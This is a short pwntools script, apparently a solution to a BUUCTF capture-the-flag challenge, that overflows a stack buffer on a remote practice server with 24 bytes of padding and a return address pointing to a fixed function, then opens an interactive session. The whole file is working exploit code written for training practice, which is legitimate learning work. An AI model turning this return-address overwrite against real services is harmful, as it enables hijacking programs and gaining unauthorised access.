from pwn import *


r = remote('node5.buuoj.cn', 25754)

func = 0x4006E6

payload = b'a' * 16 + b'b' * 8 + p64(func)

r.sendline('50')
r.sendline(payload)
r.interactive()
